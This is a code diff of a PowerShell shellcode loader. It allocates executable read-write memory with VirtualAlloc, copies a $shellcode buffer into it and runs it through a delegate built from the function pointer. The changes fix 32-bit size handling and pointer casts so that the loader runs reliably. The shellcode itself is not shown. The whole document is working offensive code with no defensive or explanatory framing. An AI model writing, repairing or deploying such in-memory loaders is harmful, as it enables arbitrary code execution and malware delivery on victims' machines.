@@ -22,10 +22,16 @@ if ([IntPtr]::Size -eq 8) {
 }
 
 $kernel32 = Add-Type -MemberDefinition $virtAlloc -Name "Kernel32" -Namespace "Win32" -PassThru
+
+# Convert size to UIntPtr if running in 32-bit mode
+if ([IntPtr]::Size -eq 4) {
+    $size = [UIntPtr]::new($size)
+}
+
 $mem = $kernel32::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
 
 # Copy shellcode to allocated memory
-[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $mem, $size)
+[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, [IntPtr]$mem, $shellcode.Length)
 
 # Define delegate for executing shellcode
 $delegateType = Add-Type @"
@@ -36,5 +42,5 @@ public delegate void ShellcodeDelegate();
 "@ -PassThru
 
 # Create delegate instance and invoke it
-$shellcodeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [ShellcodeDelegate])
+$shellcodeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([IntPtr]$mem, [ShellcodeDelegate])
 $shellcodeDelegate.Invoke()
